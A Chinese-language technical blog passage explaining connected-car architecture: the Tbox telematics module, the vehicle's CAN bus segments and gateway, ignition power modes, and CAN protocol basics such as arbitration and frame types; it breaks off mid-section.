智能车机娱乐系统有配套的车联网手机App,<br>该车联网手机App可远程查看车机状态, 远程开启座椅加热, 远程开启空调, 远程获取车机状态信息等.</p><p>比如以下是某公司开发的车联网手机App.</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E8%BD%A6%E8%81%94%E7%BD%91%E6%89%8B%E6%9C%BAApp.png" class=""></li></ol><p>车联网手机App控制车辆的拓扑图：</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/App%E6%8E%A7%E5%88%B6%E8%BD%A6%E8%BE%86%E6%8B%93%E6%89%91%E5%9B%BE.png" class=""><p>车联网手机App状态查询/远程控制功能的实现，全部依托Tbox节点，<br>Tbox节点可以接收远程4G信号，<br>之后由Tbox在诊断CAN上发起CAN诊断及控制命令，<br>Tbox还实时获取相关CAN信号并上传云平台，云平台返回数据到车联网手机App。<br>最终达到<strong>远程诊断</strong>(远程获取车辆状态, 远程读取故障码等…) 和 <strong>远程控制</strong>(控制车上某些智能硬件的作用, 比如空调, 座椅加热等…)。</p><p>这也是Tbox最最最主要的功能了, 因为他已经实现了远程诊断并控制整车了, 只要功能开发的好, 理论上整车上的所有智能硬件设备均可以被tbox远程控制!!!</p><p>Q:Tbox既然接了4G SIM卡, 那是不是可以直接打电话呢??</p><p>A: 不可以, 这张SIM一般只给车主用户提供网络服务, 虽然这张电话可以打电话, 但是由于车机系统的功能接口限定(软件界面上的功能限定), 限定了其只可以拨打道路救援电话, 厂商客服电话, 110等紧急电话, 不可拨打普通手机号码或电话号码等.</p><p>一个Tbox一个号码, 一般绑定了固定的一辆车.</p><p>比如当救援公司接到你通过车机的道路救援功能拨打的救援电话后, 救援公司立马就知道车主是哪位, 绑定的是哪辆车, 及可能知道车辆的具体位置等, 之后就可快速实施道路救援了.</p><p>Q:Tbox上这么多PIN脚是干嘛的??</p><p>A: 包括12V正负极电源供电pin脚, 诊断CAN高/CAN低pin脚, 部分外设信号pin脚, 还包括预留的部分pin脚等。</p><h1 id="整车CAN网络介绍"><a href="#整车CAN网络介绍" class="headerlink" title="整车CAN网络介绍"></a>整车CAN网络介绍</h1><p>在了解can网络之前, 先了解1个问题:</p><h2 id="1-什么是智能硬件与ECU？"><a href="#1-什么是智能硬件与ECU？" class="headerlink" title="1. 什么是智能硬件与ECU？"></a>1. 什么是智能硬件与ECU？</h2><p>何为智能硬件, 就是包含智能控制单元的硬件, 比如发动机, 发动机上有一块儿专门负责控制发动机进气量, 喷油量, 排气量的控制单元, 这块单元相当于发动机的大脑. 他具有信号发送, 信号接收, 参数存储等基本功能, 这个控制单元就是ECU.</p><pre><code> ECU(Electronic ControlUnit）电子控制单元，是汽车专用微机控制器, 一个ECU一般负责1个或多个智能硬件设备. 随着汽车的发展, 车上的智能设备越来越多, 也就是说车上的ECU也越来越多, 如何用一个网络把这些智能设备的ECU全部连接起来并整体协调控制?</code></pre><p><strong>这就是CAN网络</strong></p><h2 id="2-什么是CAN网络"><a href="#2-什么是CAN网络" class="headerlink" title="2. 什么是CAN网络"></a>2. 什么是CAN网络</h2><p>CAN是控制器局域网络(Controller Area Network, CAN)的简称，目前普遍运用在汽车网络.</p><h2 id="3-CAN网络的优势"><a href="#3-CAN网络的优势" class="headerlink" title="3. CAN网络的优势"></a>3. CAN网络的优势</h2><ol><li>开放的标准</li><li>低成本</li><li>高速实时传递数据更安全可靠</li><li>适用于各种汽车</li></ol><h2 id="4-早期基本结构图"><a href="#4-早期基本结构图" class="headerlink" title="4. 早期基本结构图"></a>4. 早期基本结构图</h2><p>CAN网络在早期的整车应用中以BCM(车身控制器)为控制中心，<br>主要是车身零部件(雨刮/大灯/车窗…)，智能硬件较少，所以早期的正常CAN网络把所有其他的ECU全部放在Other ECU里边，<br>如下图。</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E6%97%A9%E6%9C%9F%E5%9F%BA%E6%9C%AC%E7%BB%93%E6%9E%84%E5%9B%BE.png" class=""><h2 id="5-当今主流结构图"><a href="#5-当今主流结构图" class="headerlink" title="5. 当今主流结构图"></a>5. 当今主流结构图</h2><p>随着智能硬件的越来越多, 且考虑到成本与安全, </p><p>BCM已经不够完成如此庞大的网络管理了, 网关应运而生, </p><p>网关管理了5条CAN总线的各类ECU, </p><p>并对这5条CAN总线的波特率及信号优先级做了区分. </p><p>之前管理一堆车身零部件(雨刮/大灯/车窗…)的BCM也成了BCAN的一个节点!</p><p>现如今的燃油车整车CAN网络主要以网关为控制中心,   以下主要介绍这种类型的CAN网络.</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="6-CAN基本构成单元ECU节点"><a href="#6-CAN基本构成单元ECU节点" class="headerlink" title="6. CAN基本构成单元ECU节点"></a>6. CAN基本构成单元ECU节点</h2><p>车上的智能硬件设备里ECU控制单元。</p><p>比如ABS(防抱死系统)这个ECU是专门用于车辆制动过程中防止车轮被抱死的一套智能设备。</p><p> 当今汽车越豪华,ECU就越多,智能控制硬件就越多,相对价格就越贵.一般的,一辆车普通的家用  轿车都有25个左右ECU。</p><p>如下图, 车上某个智能硬件上的ECU(智能电子控制单元)</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/ECU%E8%8A%82%E7%82%B9.png" class=""><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><h2 id="7-CAN网络基本构成单元CAN总线"><a href="#7-CAN网络基本构成单元CAN总线" class="headerlink" title="7. CAN网络基本构成单元CAN总线"></a>7. CAN网络基本构成单元CAN总线</h2><p>由于车上ECU太多, 每种ECU作用各不相同, 信号传输速率(波特率)也不一致.**</p><p><strong>为了更加方便管理这些ECU, 我们把以上各类ECU按其功能/波特率分别布置在5条CAN总线上.</strong></p><p>也叫CAN BUS, 为了方便测试人员理解, 可以理解成CAN支线(可理解成一个路由器上的5条分口引出来的分支网线).</p><p>一般地, 分成5条CAN总线:</p><h3 id="7-1-PT-CAN-PowerTrain-CAN"><a href="#7-1-PT-CAN-PowerTrain-CAN" class="headerlink" title="7.1 PT CAN (PowerTrain CAN )"></a>7.1 PT CAN (PowerTrain CAN )</h3><p>动力总成CAN总线</p><p>PT CAN总线上一般有以下ECU:</p><h3 id="7-2-CH-CAN-Chassis-CAN"><a href="#7-2-CH-CAN-Chassis-CAN" class="headerlink" title="7.2 CH CAN (Chassis CAN)"></a>7.2 CH CAN (Chassis CAN)</h3><p>底盘控制CAN总线</p><p>CH CAN总线上一般有以下ECU:</p><table><thead><tr><th>ABS ( Antilock Brake System )</th><th>防抱死制动系统</th></tr></thead><tbody><tr><td>ESP(Electronic Stability Program)</td><td>车身电子稳定系统</td></tr><tr><td>EPS(Electric Power Steering)</td><td>电子转向助力</td></tr></tbody></table><p><strong>CH CAN负责汽车底盘及4个轮子的制动/稳定/转向，由于涉及整车制动/助力转向等, 所以其网络信号优先级也是较高的。</strong></p><h3 id="7-3-Body-CAN"><a href="#7-3-Body-CAN" class="headerlink" title="7.3. Body CAN"></a>7.3. Body CAN</h3><p>车身控制总线</p><p>Body CAN总线上一般有以下ECU:</p><table><thead><tr><th align="left">AC ( Air Condition )</th><th>空调</th></tr></thead><tbody><tr><td align="left">AVM(Around View Monitor)</td><td>360环视</td></tr><tr><td align="left">BCM(Body Control Module)</td><td>天窗, 车窗, 雾灯, 转向灯, 雨刮…</td></tr><tr><td align="left">IMMO(Immobilizer)</td><td>发动机防盗系统</td></tr><tr><td align="left">TPMS(Tire Pressure Monitoring System)</td><td>胎压监控系统</td></tr></tbody></table><p><strong>ody CAN负责车身上的一些提高舒适性/安全性的智能硬件的管理与控制，其网络信号优先级较低, 因为以上设备都是辅助设备。</strong></p><h3 id="7-4-Info-CAN-InfomercialCAN"><a href="#7-4-Info-CAN-InfomercialCAN" class="headerlink" title="7.4 Info CAN(InfomercialCAN)"></a>7.4 Info CAN(InfomercialCAN)</h3><p>娱乐系统总线</p><p>Info CAN 总线上一般有以下ECU:</p><table><thead><tr><th>VAES( Video Audio Entertainment System)</th><th>车载娱乐系统(中控)</th></tr></thead><tbody><tr><td>IPK(Instrument Pack)</td><td>组合仪表, 当今的数字仪表, 基本有音乐, 地图, 通话等娱乐功能.</td></tr></tbody></table><h3 id="7-5DiagCAN-Diagnose-CAN"><a href="#7-5DiagCAN-Diagnose-CAN" class="headerlink" title="7.5DiagCAN ( Diagnose CAN)"></a>7.5DiagCAN ( Diagnose CAN)</h3><p>诊断控制总线</p><table><thead><tr><th>Tbox(Telematics BOX)</th><th>远程控制模块</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><h3 id="7-6总体拓扑"><a href="#7-6总体拓扑" class="headerlink" title="7.6总体拓扑"></a>7.6总体拓扑</h3> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E6%80%BB%E4%BD%93%E6%8B%93%E6%89%91.png" class=""><p> 每条CAN总线都是由2根线组成的双绞线构成, 一根can_high, 一根can_low, 分别代表高电平, 低电平。</p><p>以下是某条CAN总线的模型图, 一条CAN总线上连着4个ECU控制单元</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/ECU%E6%8E%A7%E5%88%B6%E5%8D%95%E5%85%83%E6%8B%93%E6%89%91.png" class=""><h2 id="8-CAN网关"><a href="#8-CAN网关" class="headerlink" title="8. CAN网关"></a>8. CAN网关</h2><p>CAN网关或叫汽车网关，因为网关不仅处理CAN网络，还处理LIN网络.</p><p>CAN网关的外形结构:</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/CAN%E7%BD%91%E5%85%B3.png" class=""><p>实际can网关大概有六七十个接线pin脚，每个接线pin脚都有严格的定义, 要匹配规定好的can总线或者开关设备,<br>除了刚才涉及的10个can线接线口(5条双绞线)，2个电源线接线口，<br>还应包括<br>定速巡航设备的8个接线口，<br>电源管理方面的3个接线口，<br>钥匙开关(或无钥匙启动系统)的5个接口，<br>脚踏板的3个接线口，<br>5个LIN接线pin脚，<br>档位开关的4个接线pin脚<br>等等。</p><p>某些汽车厂商可能有更多新的硬件开关设备，电压电阻开关设备等也都有对应的接线pin脚,<br>且可能预留一些PIN脚以备用.</p><h3 id="8-1-基本功能"><a href="#8-1-基本功能" class="headerlink" title="8.1 基本功能"></a>8.1 基本功能</h3><p>CAN网关是整个CAN网络的核心, 控制着整车5条CAN总线的各类信号转发与处理，基本功能包括:</p><ol><li>连接不同波特率(传输速度)的CAN总线/LIN总线，以实现CAN网络的网关中继功能。</li><li>诊断报文/非诊断报文转发。</li><li>诊断防火墙管理。</li><li>节点在线监控。</li><li>巡航控制器开关检测。</li><li>脚踏板位置检测。</li><li>网关休眠与唤醒管理。</li><li>ECU升级/网关升级。</li><li>电压管理。</li></ol><p>CAN网关可以接收任何CAN总线(还有LIN总线)传来的不同传输速率网络信号，把这些信号按一定的标准处理后，广播到整车网络去，如果有ECU订阅(接收)了这个信号, 则ECU将解析信号并做相应的处理。<br>整车所有ECU基本是以毫秒级或者微妙级的速度在源源不断的发送并接收信号，所以网关需要处理并转发广播的信号是非常多的且必须要很快处理完的。</p><h3 id="8-2-实例一仪表显示发动机转速"><a href="#8-2-实例一仪表显示发动机转速" class="headerlink" title="8.2 实例一仪表显示发动机转速"></a>8.2 实例一仪表显示发动机转速</h3><p>发动机的转速信号, 先从PCAN的ECM(发动机引擎控制模块)节点发出, CAN网关收到后,<br>网关处理后广播以GW_开头的ECM信号到其他4条CAN总线上去.<br>用Vehicle Spy 3 CAN工具查看可以看到以下的信号内容:</p><p>ECAN上的仪表(IPK)节点订阅(接收)了发动机转速信号, 则会将这个转速信号解析, 并显示到仪表盘去.<br>由于以上信号发送频率太快, 则你就会看到仪表盘上的转速指针一直在不停地偏动.</p><p>简略发送图如下:</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E4%BB%AA%E8%A1%A8%E6%98%BE%E7%A4%BA%E5%8F%91%E5%8A%A8%E6%9C%BA%E8%BD%AC%E9%80%9F.png" class=""><h3 id="8-3-实例二安全带未扣紧-仪表端报警"><a href="#8-3-实例二安全带未扣紧-仪表端报警" class="headerlink" title="8.3 实例二安全带未扣紧, 仪表端报警"></a>8.3 实例二安全带未扣紧, 仪表端报警</h3><p>安全带未扣紧需要两个条件:</p><ol><li>车速大于5</li><li>安全带扣未扣 ( 即无电压信号 )</li></ol><p>车速一般是PCAN上的ECM(发动机引擎控制模块)节点负责信号管理的.<br>安全带扣这个设备是BCAN上的BCM(负责天窗, 车窗, 安全带扣, 雨刮等车身零部件设备…) 节点负责信号管理的.即网关收到PCAN上的ECM节点发出来的车速信号,<br>并收到了BCAN上的BCM发出来的安全带扣电压值为异常值(比如0),<br>CAN网关统一处理后转发并广播以GW_开头的信号帧,</p><p>ECAN上的仪表(IPK)节点订阅(接收)了GW开头的相关安全带未扣信号帧, 则会解析报警并显示到仪表盘去.<br>如果安全带扣一直未扣紧，则CAN网关将一直发送GW_开头的相关安全带信号帧，<br>其信号值是安全带未扣紧，所以车主会听到一直报警.</p><p>直到安全带扣上, CAN网关继续发送安全带相关的信号, 只是这个时候的信号值是安全带已扣紧，报警将立马消失.</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E4%BB%AA%E8%A1%A8%E7%AB%AF%E6%8A%A5%E8%AD%A6.png" class=""><p>以上只是两个简易的案例, 实际上, 整车所有ECU基本是以毫秒级或者微妙级的速度在源源不断的发送并接收信号, 所以网关需要处理并转发广播的信号是非常多的且必须要很快处理完的.</p><h1 id="车机电源介绍"><a href="#车机电源介绍" class="headerlink" title="车机电源介绍"></a>车机电源介绍</h1><p>车辆钥匙孔的4种状态，即LOCK, ACC, ON, START，分别对应4种电源模式，即OFF模式，ACC模式，RUN模式，CRANK模式。</p><ul><li><p>OFF模式，就是上面的LOCK，代表车辆电源未通电，此时整车can网络一般也处于休眠状态。</p></li><li><p>ACC模式，是对应上面的ACC，是Accessory的简称，整车上电状态，整车通电了，can网络也会唤醒并开始传输信号，但是发动机未启动，整车基本通上了12V的电源电压，此时车窗可用，空调可以开启(但是由于发电机未开启, 空调制冷制热压缩机都无效果，只有鼓风机在吹风)。</p></li><li><p>CRANK模式，对应上面START，发动机点火状态，即发动机已经启动，实际操作中，就是将钥匙拧到底，等发动机点火成功后，钥匙孔反弹到上图的ON，也就是下面说的RUN模式。</p></li><li><p>RUN模式，对应上面的ON，发动机处于运行模式，此时发电机也运行，并给蓄电池充电，此时的空调制冷制热都可用。</p></li></ul><h1 id="CAN"><a href="#CAN" class="headerlink" title="CAN"></a>CAN</h1><h2 id="一、-CAN-总线概念"><a href="#一、-CAN-总线概念" class="headerlink" title="一、 CAN 总线概念"></a>一、 CAN 总线概念</h2><h3 id="1-1-什么是CAN总线"><a href="#1-1-什么是CAN总线" class="headerlink" title="1.1 什么是CAN总线"></a>1.1 什么是CAN总线</h3><p>CAN 是 Controller Area Network 的缩写，是 ISO 国际标准化的串行通信协议。<br>通俗来讲，<strong>CAN总线就是一种传输数据的线，用于在不同的ECU之间传输数据。</strong></p><p>CAN总线有两个ISO国际标准：<strong>ISO11898 和 ISO11519</strong>。</p><ul><li><p><strong>ISO11898</strong> 定义了通信速率为 125 kbps～1 Mbps 的<strong>高速 CAN</strong> 通信标准，属于<strong>闭环总线</strong>，传输速率可达1Mbps，总线长度 ≤ 40米。</p></li><li><p><strong>ISO11519</strong> 定义了通信速率为 10～125 kbps 的<strong>低速 CAN</strong> 通信标准，属于<strong>开环总线</strong>，传输速率为40kbps时，总线长度可达1000米。</p></li><li><blockquote><p> Tips: <strong>&lt;总线的传输速率&gt;<strong>：又称为</strong>总线的通信速率</strong>，指的是<strong>位速率</strong>。或称为<strong>比特率</strong>（和波特率不是一回事），表示的是：单位时间内，通信线路上传输的二进制位的数量，其基本单位是 bps 或者 b/s (bit per second)。</p></blockquote></li></ul><h3 id="1-2-CAN的拓扑结构"><a href="#1-2-CAN的拓扑结构" class="headerlink" title="1.2 CAN的拓扑结构"></a>1.2 CAN的拓扑结构</h3><p>下图中，左边是高速CAN总线的拓扑结构，右边是低速CAN总线的拓扑结构。</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/CAN%E7%9A%84%E6%8B%93%E6%89%91%E7%BB%93%E6%9E%84.png" class=""><p>如图中所示，CAN总线包括CAN_H 和 CAN_L 两根线。节点通过CAN控制器和CAN收发器连接到CAN总线上。</p><blockquote><p>Tips ：通常来讲，ECU内部集成了CAN控制器和CAN收发器，但是也有没集成的，需要自己外加。</p></blockquote><h3 id="1-3-CAN信号表示"><a href="#1-3-CAN信号表示" class="headerlink" title="1.3 CAN信号表示"></a>1.3 CAN信号表示</h3><p>在CAN总线上，利用CAN_H和CAN_L两根线上的电位差来表示CAN信号。CAN总线上的电位差分为显性电平和隐性电平。其中显性电平为逻辑0，隐性电平为逻辑1。<br>ISO11898标准（125kbps ~ 1Mbps）和ISO11519标准（10kbps ~ 125kbps）中CAN信号的表示分别如下所示：</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/CAN%E4%BF%A1%E5%8F%B7%E8%A1%A8%E7%A4%BA.png" class=""><h3 id="1-4-CAN信号传输"><a href="#1-4-CAN信号传输" class="headerlink" title="1.4 CAN信号传输"></a>1.4 CAN信号传输</h3><p>发送过程：<br>CAN控制器将CPU传来的信号转换为逻辑电平（即逻辑0-显性电平或者逻辑1-隐性电平）。CAN发射器接收逻辑电平之后，再将其转换为差分电平输出到CAN总线上。</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/CAN%E4%BF%A1%E5%8F%B7%E4%BC%A0%E8%BE%93.png" class=""><p>接收过程：<br>CAN接收器将CAN_H 和 CAN_L 线上传来的差分电平转换为逻辑电平输出到CAN控制器，CAN控制器再把该逻辑电平转化为相应的信号发送到CPU上。</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/CAN%E4%BF%A1%E5%8F%B7%E6%8E%A5%E6%94%B6.png" class=""><p>概括的讲：<br>发送方通过使总线电平发生变化，将其信息传递到CAN总线上。<br>接收方通过监听总线电平，将总线上的消息读入自己的接收器。</p><h2 id="二、CAN通信的特点"><a href="#二、CAN通信的特点" class="headerlink" title="二、CAN通信的特点"></a>二、CAN通信的特点</h2><h3 id="2-1-多主工作方式"><a href="#2-1-多主工作方式" class="headerlink" title="2.1 多主工作方式"></a>2.1 多主工作方式</h3><p>所谓多主工作方式，指的是：总线上的所有节点没有主从之分，大家都处于平等的地位。<br>反应在数据传输上，即是：在总线空闲状态，任意节点都可以向总线上发送消息。</p><p>Tips: &lt;总线空闲状态&gt;：当总线上的上出现连续的11位隐性电平，那么总线就处于空闲状态。也就是说对于任意一个节点而言，只要它监听到总线上连续出现了11位隐性电平，那么该节点就会认为总线当前处于空闲状态，它就会立即向总线上发送自己的报文。<br>至于为什么连续出现11位隐性电平，就可以判定+总线处于空闲状态，这个问题可以结合CAN协议的帧结构来进行理解。</p><p>在多主工作方式下：</p><ol><li>最先向总线发送消息的节点获得总线的发送权；</li><li>当多个节点同时向总线发送消息时，所发送消息的优先权高的那个节点获得总线的发送权。</li></ol><h3 id="2-2-非破坏性位仲裁机制"><a href="#2-2-非破坏性位仲裁机制" class="headerlink" title="2.2 非破坏性位仲裁机制"></a>2.2 非破坏性位仲裁机制</h3><p>在CAN协议中，所有的消息都以固定的帧格式发送。<br>当多个节点同时向总线发送消息时，对各个消息的标识符（即ID号）进行逐位仲裁，<br>如果某个节点发送的消息仲裁获胜，那么这个节点将获取总线的发送权，仲裁失败的节点则立即停止发送并转变为监听（接收）状态。</p><p>例如：Node_A和Node_B同时向总线发送各自的消息Msg_1和Msg_2，<br>那么对Msg_1的ID号ID_1和Msg_2的ID号ID_2进行逐位仲裁，<br>如果仲裁结果是：ID_1的优先级比ID_2高，那么Msg_1在仲裁中获胜，<br>于是发出Msg_1这条报文的节点Node_A就获得了总线的发送权。<br>同时，Msg_2在仲裁中失败，于是Node_B就转换到监听总线电平的状态。</p><p>这种仲裁机制既不会造成已发送数据的延迟，也不会破坏已经发送的数据，所以称为非破坏性仲裁机制。</p><h3 id="2-3-系统的柔性"><a href="#2-3-系统的柔性" class="headerlink" title="2.3 系统的柔性"></a>2.3 系统的柔性</h3><p>CAN总线上的节点没有“地址”的概念，因此在总线上增加节点时，不会对总线上已有节点的软硬件及应用层造成影响。</p><h3 id="2-4-通信速度"><a href="#2-4-通信速度" class="headerlink" title="2.4 通信速度"></a>2.4 通信速度</h3><p>在同一条CAN线上，所有节点的通信速度（位速率）必须相同，如果两条不同通信速度总线上的节点想要实现信息交互，必须通过网关。</p><p>例如：汽车上一般有两条CAN总线：500kbps的驱动系统CAN总线和125kbps的舒适系统CAN总线，如果驱动系统CAN总线上的发动机节点要把自己的转速信息发送给舒适系统CAN总线上的转速表节点，那么这两条总线必须通过网关相连。</p><h3 id="2-5-数据传输方式"><a href="#2-5-数据传输方式" class="headerlink" title="2.5 数据传输方式"></a>2.5 数据传输方式</h3><p>CAN总线可以实现一对一，一对多以及广播的数据传输方式，这依赖于验收滤波技术。验收滤波技术的实现机制参见本系列笔记的第二篇CAN协议帧结构中的介绍。</p><h3 id="2-6-远程数据请求"><a href="#2-6-远程数据请求" class="headerlink" title="2.6 远程数据请求"></a>2.6 远程数据请求</h3><p>某个节点Node_A可以通过发送“遥控帧”到总线上的方式，请求某个节点Node_B来发送由该遥控帧所指定的报文。</p><h3 id="2-7-错误检测、错误通知、错误恢复功能"><a href="#2-7-错误检测、错误通知、错误恢复功能" class="headerlink" title="2.7 错误检测、错误通知、错误恢复功能"></a>2.7 错误检测、错误通知、错误恢复功能</h3><p>所有的节点都可以检测出错误（错误检测功能）；<br>检测出错误的节点会立即通知总线上其它所有的节点（错误通知功能）；<br>正在发送消息的节点，如果检测到错误，会立即停止当前的发送，并在同时不断地重复发送此消息，直到该消息发送成功为止（错误恢复功能）。</p><h3 id="2-8-故障封闭"><a href="#2-8-故障封闭" class="headerlink" title="2.8 故障封闭"></a>2.8 故障封闭</h3><p>节点能够判断错误的类型，判断是暂时性的数据错误（如噪声干扰）还是持续性的数据错误（如节点内部故障），如果判断是严重的持续性错误，那么节点就会切断自己与总线的联系，从而避免影响总线上其他节点的正常工作。</p><h2 id="三、CAN通信网络结构"><a href="#三、CAN通信网络结构" class="headerlink" title="三、CAN通信网络结构"></a>三、CAN通信网络结构</h2><h3 id="3-1-OSI基本参照模型"><a href="#3-1-OSI基本参照模型" class="headerlink" title="3.1 OSI基本参照模型"></a>3.1 OSI基本参照模型</h3><p>实际上，CAN总线网络底层只采用了OSI基本参照模型中的数据链路层、传输层。而在CAN网络高层仅采用了OSI基本参照</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/OSI%E5%9F%BA%E6%9C%AC%E5%8F%82%E7%85%A7%E6%A8%A1%E5%9E%8B.png" class=""><h3 id="3-2-CAN协议网络层次"><a href="#3-2-CAN协议网络层次" class="headerlink" title="3.2 CAN协议网络层次"></a>3.2 CAN协议网络层次</h3><p>在CAN协议中，ISO标准只对数据链路层和物理层做了规定。对于数据链路层和物理层的一部分，ISO11898和ISO11519-2的规定是相同，但是在物理层的PMD子层和MDI子层是不同的。</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/CAN%E5%8D%8F%E8%AE%AE%E7%BD%91%E7%BB%9C%E5%B1%82%E6%AC%A1.png" class=""><p>在CAN总线，每一层网络中定义的事项如下：</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E6%AF%8F%E4%B8%80%E5%B1%82%E7%BD%91%E7%BB%9C%E4%B8%AD%E5%AE%9A%E4%B9%89.png" class=""><h2 id="四、CAN通信网络结构"><a href="#四、CAN通信网络结构" class="headerlink" title="四、CAN通信网络结构"></a>四、CAN通信网络结构</h2><h3 id="4-1-总线"><a href="#4-1-总线" class="headerlink" title="4.1 总线"></a>4.1 总线</h3><p>CAN总线是<strong>广播</strong>类型的总线，意味着</p><ol><li>所有节点都可以<strong>侦听</strong>到所有传输，无法向一个特定的节点发送报文。</li><li>所有节点都将始终接受所有通信。</li></ol><p>注： CAN硬件能够提供本地过滤功能，从而每个节点只可以对感兴趣的报文作出响应。</p><h3 id="4-2-CAN报文"><a href="#4-2-CAN报文" class="headerlink" title="4.2 CAN报文"></a>4.2 CAN报文</h3><p>CAN使用短报文—最大效用负载是94位，报文中没有明确地址；</p><p>相反，可以认为报文是通过内容寻址，也就是报文的内容隐式地确定地址。</p><h3 id="4-3-报文类型"><a href="#4-3-报文类型" class="headerlink" title="4.3 报文类型"></a>4.3 报文类型</h3><p>CAN总线上有四种不同报文类型(或帧)</p><h4 id="4-3-1-数据帧"><a href="#4-3-1-数据帧" class="headerlink" title="4.3.1 数据帧"></a>4.3.1 数据帧</h4><p>所谓数据帧，就是包含了我们所要传输的数据，其作用当然也就是承载发送节点要传递给接受节点的数据</p><p>数据帧 的帧结构如下图所示，包含七个段：<strong>帧起始、仲裁段、控制段、数据段、CRC段、ACK段、帧结束</strong>。</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E6%95%B0%E6%8D%AE%E5%B8%A7.png" class=""><h4 id="4-3-2-远程帧-遥控帧"><a href="#4-3-2-远程帧-遥控帧" class="headerlink" title="4.3.2 远程帧/遥控帧"></a>4.3.2 远程帧/遥控帧</h4><p>遥控帧的作用可以描述为：请求其他节点发出与本遥控帧具有相同ID号的数据帧。</p><p>例：</p><p>在某一时刻，节点Node_A向总线发送了一个ID号为ID_2的遥控帧，那么意味着Node_A请求总线上的其他节点发送ID号为ID_2的数据帧。</p><p>节点Node_B能够发出ID号为ID_2的数据帧，那么Node_B就会在收到Node_A发出的遥控帧之后，立刻向总线上发送ID号为ID_2的数据帧。</p><p>遥控帧 相比于数据帧，从帧结构上来看，只是少了数据段，包含六个段：帧起始、仲裁段、控制段、CRC段、ACK段、帧结束。</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E8%BF%9C%E7%A8%8B%E5%B8%A7.png" class=""><p>数据帧和遥控帧都分为标准帧（CAN2.0A）和扩展帧（CAN2.0B）两种结构。<br>遥控帧相比于数据帧除了缺少数据段之外，遥控帧的RTR位恒为隐性1，数据帧的RTR位恒为显性0。</p><p>CAN 2.0A，一个11位的标识符 和 一个支配数据帧 的RTR位。<br>CAN 2.0B，一个29位的标识符（其中还包括两个隐性位：SRR 和 IDE） 和 RTR 字段 —– 见扩展帧。</p><h3 id="4-4-帧结构"><a href="#4-4-帧结构" class="headerlink" title="4.4 帧结构"></a>4.4 帧结构</h3><h4 id="4-4-1-帧起始"><a href="#4-4-1-帧起始" class="headerlink" title="4.4.1 帧起始"></a>4.4.1 帧起始</h4><p>帧的最开始的一位是帧起始，也叫SOF（Start Of Frame），SOF恒为显性位，即逻辑 0 。<br>帧起始表示CAN_H 和 CAN_L上有了电位差，也就是说，一旦总线上有了SOF就表示总线上开始有报文了。</p><h4 id="4-4-2-仲裁段"><a href="#4-4-2-仲裁段" class="headerlink" title="4.4.2 仲裁段"></a>4.4.2 仲裁段</h4><p>仲裁段是用来判定一帧报文优先级的依据，仲裁段中的ID号也是实现报文过滤机制的基础。</p><p>仲裁段由以下几个部分组成，</p><p>数据帧仲裁段：</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E4%BB%B2%E8%A3%81%E6%AE%B5.png" class=""><p>遥控帧仲裁段：</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E9%81%A5%E6%8E%A7%E5%B8%A7%E4%BB%B2%E8%A3%81%E6%AE%B5.png" class=""><p>可以看到相比于数据帧仲裁段RTR位恒为显性0，遥控帧仲裁段的RTR位恒为隐性1。</p><h5 id="4-4-2-1-仲裁过程"><a href="#4-4-2-1-仲裁过程" class="headerlink" title="4.4.2.1 仲裁过程"></a>4.4.2.1 